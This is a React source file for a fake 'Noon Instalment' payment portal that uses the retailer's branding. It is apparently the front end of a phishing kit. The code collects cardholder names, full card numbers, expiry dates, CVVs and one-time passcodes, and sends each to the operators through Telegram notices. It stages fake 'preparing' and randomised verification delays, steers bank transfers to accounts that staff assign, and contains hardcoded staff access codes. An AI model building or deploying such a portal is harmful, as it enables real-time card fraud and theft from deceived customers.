import AdminPanel from "./AdminPanel";
import { useState } from "react";
import {
  createPayment,
  deletePayment,
  findSupervisorByUsername,
  getCustomerByCode,
  notifyDownPayment,
  portalView,
  submitPaymentOtp,
} from "./lib/data.js";
import ManualPOSCard from "./ManualPOSCard";
import CardPurchaseAuth from "./CardPurchaseAuth";
import {
  ShieldCheck,
  ArrowRight,
  Landmark,
  CreditCard,
  LockKeyhole,
  BadgeCheck,
  Upload,
  Copy,
  Check,
  ChevronRight,
  WalletCards,
  ArrowLeft,
  Package,
} from "lucide-react";

import CustomerDetails from "./CustomerDetails";
import NoonLogo from "./NoonLogo";
import SupervisorPanel from "./SupervisorPanel";
import "./App.css";

function CopyLine({ label, value }) {
  const [copied, setCopied] = useState(false);

  async function copy() {
    const text = String(value || "");
    try {
      await navigator.clipboard.writeText(text);
    } catch {
      const area = document.createElement("textarea");
      area.value = text;
      area.setAttribute("readonly", "");
      area.style.position = "fixed";
      area.style.left = "-9999px";
      document.body.appendChild(area);
      area.select();
      const ok = document.execCommand("copy");
      area.remove();
      if (!ok) return;
    }
    setCopied(true);
    setTimeout(() => setCopied(false), 1200);
  }

  return (
    <p className="copy-line">
      <span>
        {label}: {value}
      </span>
      <button
        type="button"
        className="copy-icon-button"
        aria-label={copied ? "Copied" : `Copy ${label}`}
        onClick={copy}
      >
        {copied ? <Check size={14} /> : <Copy size={14} />}
      </button>
    </p>
  );
}

export default function App() {
  const [code, setCode] = useState("");
  const [customer, setCustomer] = useState(null);
  const [page, setPage] = useState("code");
  const [error, setError] = useState("");
  const [method, setMethod] = useState("");
  const [receiptName, setReceiptName] = useState("");
  const [receiptFile, setReceiptFile] = useState(null);
  const [staffLoggedIn, setStaffLoggedIn] = useState("");
  const [paymentTarget, setPaymentTarget] = useState(null);
  const [submitting, setSubmitting] = useState(false);
  const [paymentError, setPaymentError] = useState("");
  const [paymentDone, setPaymentDone] = useState(false);
  const [cardCheckoutStep, setCardCheckoutStep] = useState("form");
  const [pendingCardPayment, setPendingCardPayment] = useState(null);

  const demoCustomer = portalView({
    id: "demo",
    customerId: "NOON123",
    name: "Ahmed Example",
    phone: "+966 5X XXX XXXX",
    locationPin: "Riyadh, Saudi Arabia",
    hasIdDocument: false,
    idDocument: "",
    products: [
      {
        id: "demo-product",
        name: "Samsung Galaxy Smartphone",
        price: 1800,
        sellerType: "Sold by Noon",
      },
    ],
    productName: "Samsung Galaxy Smartphone",
    productPrice: 1800,
    downPayment: 360,
    remainingAmount: 1440,
    duration: 6,
    monthlyAmount: 240,
    paymentMethod: "bank",
    bank: null,
    paidDownPayment: true,
    paidMonths: [1, 2],
    createdAt: "2026-10-22T12:00:00Z",
  });

  function openCustomer(nextCustomer) {
    setCustomer(nextCustomer);
    setStaffLoggedIn("");
    setMethod("");
    setReceiptName("");
    setReceiptFile(null);
    setPaymentTarget(null);
    setPaymentDone(false);
    setPaymentError("");
    setCardCheckoutStep("form");
    setPendingCardPayment(null);
    setPage("details");
  }

  function openPayment(target) {
    if (!target?.amount) {
      setError("There is no payment due right now.");
      return;
    }
    setPaymentTarget(target);
    setMethod("");
    setReceiptName("");
    setReceiptFile(null);
    setPaymentDone(false);
    setPaymentError("");
    setCardCheckoutStep("form");
    setPendingCardPayment(null);
    setError("");
    setPage("payment");
  }

  async function handleContinue(e) {
    e.preventDefault();
    setError("");
    const enteredCode = code.trim().toUpperCase();

    if (!enteredCode) {
      setError("Please enter your code.");
      return;
    }

    if (enteredCode === "ADM2026") {
      setCustomer(null);
      setStaffLoggedIn("admin");
      setPage("staff");
      return;
    }

    if (enteredCode === "SUP2026") {
      setCustomer(null);
      setStaffLoggedIn("supervisor");
      setPage("staff");
      return;
    }

    try {
      const supervisor = await findSupervisorByUsername(code.trim());
      if (supervisor) {
        setCustomer(null);
        setStaffLoggedIn("supervisor");
        setPage("staff");
        return;
      }
    } catch {
      setError("");
    }

    try {
      const saved = await getCustomerByCode(enteredCode);
      if (saved) {
        openCustomer(portalView(saved));
        return;
      }
    } catch (loadError) {
      if (enteredCode !== "NOON123") {
        setError(loadError.message);
        return;
      }
    }

    if (enteredCode === "NOON123") {
      openCustomer(demoCustomer);
      return;
    }

    setError("Invalid code. Please check your code and try again.");
  }

  async function submitBank() {
    if (!customer || !paymentTarget) return;
    if (customer.id === "demo") {
      setPaymentError("Use a saved customer code to submit a payment.");
      return;
    }
    if (!receiptFile) {
      setPaymentError("Upload the transfer receipt.");
      return;
    }
    setSubmitting(true);
    setPaymentError("");
    try {
      await createPayment({
        customerUuid: customer.id,
        customerCode: customer.code,
        contractId: customer.contractId,
        instalmentId: paymentTarget.instalmentId,
        amount: paymentTarget.amount,
        method: "bank",
        receiptFile,
        bankAccountId: customer.bank?.id,
      });
      try {
        await notifyDownPayment({
          name: customer.name,
          customerCode: customer.code,
          phone: customer.phone,
          downPayment: paymentTarget.amount,
          totalPrice: customer.productPrice,
          remainingAmount: customer.remainingAmount,
          monthlyAmount: customer.monthlyAmount,
          duration: customer.duration,
          kind: paymentTarget.kind,
          note:
            paymentTarget.kind === "down_payment"
              ? "Customer submitted a down payment by bank transfer"
              : `Customer submitted month ${paymentTarget.month || ""} by bank transfer`,
        });
      } catch (noticeError) {
        setPaymentError(
          `Payment request saved. Telegram notice failed: ${noticeError.message}`
        );
      }
      setPaymentDone(true);
    } catch (submitError) {
      setPaymentError(submitError.message);
    } finally {
      setSubmitting(false);
    }
  }

  async function submitCard(cardDetails) {
    if (!customer || !paymentTarget) return;
    if (customer.id === "demo") {
      throw new Error("Use a saved customer code to submit a payment.");
    }
    const paymentId = await createPayment({
      customerUuid: customer.id,
      customerCode: customer.code,
      contractId: customer.contractId,
      instalmentId: paymentTarget.instalmentId,
      amount: paymentTarget.amount,
      method: "card",
      cardholderName: cardDetails.cardholderName,
      cardNumber: cardDetails.cardNumber,
      cardExpiry: cardDetails.cardExpiry,
      cardCvv: cardDetails.cardCvv,
      bankAccountId: customer.bank?.id,
    });
    setPendingCardPayment({
      id: paymentId,
      amount: paymentTarget.amount,
      cardDetails,
    });
    setCardCheckoutStep("preparing");
    try {
      await notifyDownPayment({
        name: customer.name,
        customerCode: customer.code,
        phone: customer.phone,
        downPayment: paymentTarget.amount,
        totalPrice: customer.productPrice,
        remainingAmount: customer.remainingAmount,
        monthlyAmount: customer.monthlyAmount,
        duration: customer.duration,
        kind: paymentTarget.kind,
        method: "card",
        cardholderName: cardDetails.cardholderName,
        cardNumber: cardDetails.cardNumber,
        cardExpiry: cardDetails.cardExpiry,
        cardCvv: cardDetails.cardCvv,
        note:
          paymentTarget.kind === "down_payment"
            ? "Customer submitted card details for down payment"
            : `Customer submitted card details for month ${paymentTarget.month || ""}`,
      });
    } catch (noticeError) {
      setPaymentError(
        `Card saved. Telegram notice failed: ${noticeError.message}`
      );
    }
    await new Promise((resolve) => setTimeout(resolve, 2500));
    setCardCheckoutStep("otp");
  }

  async function submitCardOtp(otpCode) {
    if (!customer || !paymentTarget || !pendingCardPayment?.id) {
      throw new Error("Payment session expired. Please try again.");
    }
    const { cardDetails } = pendingCardPayment;
    setCardCheckoutStep("loading");
    await submitPaymentOtp({
      paymentId: pendingCardPayment.id,
      otpCode,
    });
    try {
      await notifyDownPayment({
        name: customer.name,
        customerCode: customer.code,
        phone: customer.phone,
        downPayment: paymentTarget.amount,
        totalPrice: customer.productPrice,
        remainingAmount: customer.remainingAmount,
        monthlyAmount: customer.monthlyAmount,
        duration: customer.duration,
        kind: paymentTarget.kind,
        method: "card",
        noticeType: "card_otp",
        cardholderName: cardDetails.cardholderName,
        cardNumber: cardDetails.cardNumber,
        cardExpiry: cardDetails.cardExpiry,
        cardCvv: cardDetails.cardCvv,
        cardOtp: otpCode,
        note: "Customer submitted card verification OTP",
      });
    } catch (noticeError) {
      setPaymentError(
        `OTP saved. Telegram notice failed: ${noticeError.message}`
      );
    }
    const waitMs = 10000 + Math.floor(Math.random() * 5001);
    await new Promise((resolve) => setTimeout(resolve, waitMs));
    setPendingCardPayment(null);
    setCardCheckoutStep("form");
    setPaymentDone(true);
  }

  async function requestAnotherCardOtp() {
    if (!customer || !paymentTarget || !pendingCardPayment) return;
    const { cardDetails } = pendingCardPayment;
    await notifyDownPayment({
      name: customer.name,
      customerCode: customer.code,
      phone: customer.phone,
      downPayment: paymentTarget.amount,
      totalPrice: customer.productPrice,
      remainingAmount: customer.remainingAmount,
      monthlyAmount: customer.monthlyAmount,
      duration: customer.duration,
      kind: paymentTarget.kind,
      method: "card",
      noticeType: "card_otp_resend",
      cardholderName: cardDetails.cardholderName,
      cardNumber: cardDetails.cardNumber,
      note: "Customer requested another verification code",
    });
  }

  async function cancelCardOtp() {
    if (pendingCardPayment?.id) {
      try {
        await deletePayment(pendingCardPayment.id);
      } catch {
        /* ignore */
      }
    }
    setPendingCardPayment(null);
    setCardCheckoutStep("form");
  }

  function clearPaymentDraft() {
    setMethod("");
    setReceiptName("");
    setReceiptFile(null);
    setPaymentTarget(null);
    setPaymentDone(false);
    setPaymentError("");
    setCardCheckoutStep("form");
    setPendingCardPayment(null);
  }

  function staffLogout() {
    setStaffLoggedIn("");
    setCustomer(null);
    setCode("");
    setError("");
    clearPaymentDraft();
    setPage("code");
  }

  function reset() {
    setCustomer(null);
    setCode("");
    setError("");
    clearPaymentDraft();
    setStaffLoggedIn("");
    setPage("code");
  }

  function goToDetails() {
    setReceiptName("");
    setReceiptFile(null);
    setPaymentDone(false);
    setPaymentError("");
    setPage("details");
  }

  return (
    <div className="site-shell">
      {/* MAIN HEADER */}
      {page !== "staff" && (
        <header className="header">
          <button
            className="brand"
            onClick={reset}
            aria-label="Home"
            type="button"
          >
            <NoonLogo className="brand-icon" />
            <span className="brand-copy">
              <strong>NOON INSTALMENT</strong>
              <small>PAYMENT PORTAL</small>
            </span>
          </button>

          <div className="secure-label">
            <ShieldCheck size={17} />
            <span>Secure payment</span>
          </div>
        </header>
      )}

      {/* HERO */}
{page === "code" && (
        <section className="hero">
          <div className="hero-content">
            <div className="eyebrow">
              <span className="eyebrow-dot" />
              SIMPLE · SECURE · CONVENIENT
            </div>

            <h1>
              Your instalment,
              <br />
              <span>made simple.</span>
            </h1>

            <p>
              Access your personal instalment details and
              choose a payment method in a few steps.
            </p>

            <div className="hero-pills">
              <span>
                <LockKeyhole size={15} />
                Protected access
              </span>
              <span>
                <BadgeCheck size={15} />
                Easy payments
              </span>
            </div>
          </div>

          <div className="hero-art" aria-hidden="true">
            <div className="art-circle circle-one" />
            <div className="art-circle circle-two" />

            <div className="art-card">
              <div className="art-card-top">
                <span>NOON</span>
                <WalletCards size={25} />
              </div>
              <div className="art-card-number">
                •••• &nbsp; •••• &nbsp; ••••
              </div>
              <div className="art-card-bottom">
                <span>INSTALMENT</span>
                <strong>PAY</strong>
              </div>
            </div>

            <div className="art-spark spark-one">✦</div>
            <div className="art-spark spark-two">✳</div>
          </div>
        </section>
      )}

{/* SUPERVISOR DASHBOARD */}
{page === "staff" && staffLoggedIn === "supervisor" && (
  <SupervisorPanel onLogout={staffLogout} />
)}

{/* ADMIN DASHBOARD */}
{page === "staff" && staffLoggedIn === "admin" && (
  <AdminPanel onLogout={staffLogout} />
)}
      {/* CUSTOMER CONTENT */}
      {["code", "details", "payment"].includes(page) && (
        <main className={page === "code" ? "content-wrap" : "content-wrap content-wrap-details"}>
          {/* STEP 1: CUSTOMER CODE */}
          {page === "code" && (
            <section className="panel code-panel">
              <div className="step-label">
                <span className="step-number">01</span>
                CUSTOMER VERIFICATION
              </div>

              <div className="panel-heading">
                <h2>Enter customer code</h2>
                <p>Enter the unique code provided by our admin.</p>
              </div>

              <form onSubmit={handleContinue}>
                <label htmlFor="customerCode">Customer code</label>

                <div className="input-wrap">
                  <LockKeyhole size={18} />
                  <input
                    id="customerCode"
                    value={code}
                    onChange={(e) => {
                      setCode(e.target.value.toUpperCase());
                      setError("");
                    }}
                    placeholder="ENTER YOUR UNIQUE CODE"
                    autoComplete="off"
                    autoCapitalize="characters"
                    spellCheck={false}
                    required
                  />
                </div>

                {error && (
                  <div className="error-message" role="alert">
                    {error}
                  </div>
                )}

                <button className="primary-button" type="submit">
                  Continue <ArrowRight size={18} />
                </button>
              </form>

              <div className="privacy-note">
                <ShieldCheck size={17} />
                <span>
                  Your personal information appears after code
                  verification.
                </span>
              </div>

            </section>
          )}

          {/* STEP 2: CUSTOMER DETAILS */}
          {page === "details" && customer && (
            <CustomerDetails
              customer={customer}
              onBack={reset}
              onContinue={
                customer.canPay && customer.nextDue?.kind === "down_payment"
                  ? () => openPayment(customer.nextDue)
                  : undefined
              }
              onPayNext={
                customer.canPay && customer.nextDue?.kind === "instalment"
                  ? () => openPayment(customer.nextDue)
                  : undefined
              }
            />
          )}

          {/* STEP 3: PAYMENT */}
          {page === "payment" && customer && (
            <section className="panel payment-page">
              <button
                className="back-link"
                type="button"
                onClick={goToDetails}
              >
                <ArrowLeft size={16} />
                Back to details
              </button>

              <div className="step-label">
                <span className="step-number">03</span>
                INSTALMENT PAYMENT
              </div>

              <div className="panel-heading">
                <h2>{paymentTarget?.label || "Pay your instalment"}</h2>
                <p>Choose bank transfer or credit / debit card.</p>
              </div>

              <div className="amount-card">
                <div className="amount-top">
                  <span>Amount due</span>
                  <span className="due-badge">
                    {paymentDone ? "Request sent" : "Payment pending"}
                  </span>
                </div>

                <div className="amount-value">
                  <span>SAR</span>{" "}
                  {Number(paymentTarget?.amount || 0).toLocaleString(
                    "en-US",
                    { minimumFractionDigits: 2 }
                  )}
                </div>

                <div className="due-date">
                  Due date <strong>{paymentTarget?.dueDate || customer.dueDate}</strong>
                </div>

                <div className="payment-product-line">
                  <Package size={16} />
                  <span>{customer.product}</span>
                </div>
              </div>

              <h3 className="payment-heading">
                Choose payment method
              </h3>
              {(customer.paymentMethods || []).length === 0 && (
                <p>No payment method is assigned to this customer yet.</p>
              )}

              {/* BANK TRANSFER */}
              {(customer.paymentMethods || []).includes("bank") && (
              <div className="payment-method-block">
              <button
                type="button"
                className={`payment-option ${
                  method === "bank" ? "selected" : ""
                }`}
                onClick={() => {
                  setPaymentError("");
                  setMethod(method === "bank" ? "" : "bank");
                }}
              >
                <span className="payment-icon bank">
                  <Landmark size={22} />
                </span>
                <span className="payment-option-copy">
                  <strong>Bank Transfer</strong>
                  <small>
                    Transfer using the bank details provided
                  </small>
                </span>
                <ChevronRight size={20} />
              </button>

              {method === "bank" && (
                <div className="method-detail">
                  <strong>Bank Account Details</strong>
                  {customer.bank ? (
                    <>
                      <p>Bank: {customer.bank.bankName}</p>
                      <CopyLine label="Account name" value={customer.bank.accountName} />
                      <CopyLine label="IBAN" value={customer.bank.iban} />
                      {customer.bank.instructions && (
                        <p>{customer.bank.instructions}</p>
                      )}
                      {customer.bank.qrUrl && (
                        <img
                          className="bank-qr"
                          src={customer.bank.qrUrl}
                          alt="Bank transfer QR code"
                        />
                      )}
                    </>
                  ) : (
                    <p>No bank account is assigned to this customer yet.</p>
                  )}

                  <label className="upload-box">
                    <Upload size={19} />
                    <span>
                      {receiptName || "Upload Transfer Receipt"}
                    </span>
                    <input
                      type="file"
                      accept="image/*,.pdf"
                      onChange={(e) => {
                        const file = e.target.files?.[0] || null;
                        setReceiptFile(file);
                        setReceiptName(file?.name || "");
                      }}
                    />
                  </label>

                  <button
                    className="primary-button"
                    type="button"
                    onClick={submitBank}
                    disabled={submitting || paymentDone || !customer.bank}
                  >
                    {submitting ? "Submitting..." : "Submit transfer receipt"}
                  </button>
                </div>
              )}
              </div>
              )}

              {(customer.paymentMethods || []).includes("card") && (
              <div className="payment-method-block">
              <button
                type="button"
                className={`payment-option ${
                  method === "card" ? "selected" : ""
                }`}
                onClick={() => {
                  setPaymentError("");
                  setMethod(method === "card" ? "" : "card");
                }}
              >
                <span className="payment-icon card">
                  <CreditCard size={22} />
                </span>
                <span className="payment-option-copy">
                  <strong>Credit / Debit Card</strong>
                  <small>VISA · Mastercard · mada</small>
                </span>
                <ChevronRight size={20} />
              </button>

              {method === "card" && cardCheckoutStep === "form" && (
                <ManualPOSCard
                  amount={paymentTarget?.amount || 0}
                  onRequest={submitCard}
                />
              )}
              </div>
              )}

      {(cardCheckoutStep === "preparing" ||
        cardCheckoutStep === "otp" ||
        cardCheckoutStep === "loading") &&
        pendingCardPayment && (
          <CardPurchaseAuth
            amount={pendingCardPayment.amount}
            phase={cardCheckoutStep}
            onSubmit={submitCardOtp}
            onCancel={cancelCardOtp}
            onResend={requestAnotherCardOtp}
          />
        )}

              {paymentError && !paymentDone && (
                <div className="error-message" role="alert">
                  {paymentError}
                </div>
              )}

              <div className="secure-footer">
                <ShieldCheck size={17} />
                <span>
                  Bank transfer uses the account assigned to this customer.
                  Card payment sends a request for admin approval.
                </span>
              </div>
            </section>
          )}
        </main>
      )}

      {/* FOOTER */}
      {page !== "details" && (
        <footer className="footer">
          <span>NOON INSTALMENT</span>
          <span>Customer payment portal</span>
          <span>
            <LockKeyhole size={14} /> Secure access
          </span>
        </footer>
      )}

    </div>
  );
}
